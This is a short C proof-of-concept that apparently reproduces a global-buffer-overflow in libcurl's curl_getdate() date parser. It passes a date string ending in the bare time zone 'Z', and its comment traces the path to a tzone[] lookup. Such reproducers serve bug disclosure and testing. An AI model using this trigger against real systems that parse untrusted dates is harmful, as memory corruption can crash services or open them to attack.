/* Proof-of-concept for a global-buffer-overflow in curl's date parser.
 *
 * curl_getdate() is libcurl's public date-string parser (used internally
 * to parse things like HTTP Date/Expires headers, and also exposed as a
 * public API for applications). A bare, single-letter military time zone
 * designator such as "Z" (Zulu/UTC) is valid, in-contract input for this
 * parser.
 *
 * Reachable via: curl_getdate() -> parsedate() -> datestring() ->
 * checktz() -> tzone[] lookup.
 */
#include <stdio.h>
#include <time.h>
#include <curl/curl.h>

int main(void)
{
  const char *datestring = "Sun, 06 Nov 1994 08:49:37 Z";
  time_t result = curl_getdate(datestring, NULL);

  printf("parsed '%s' -> %ld\n", datestring, (long)result);
  return 0;
}
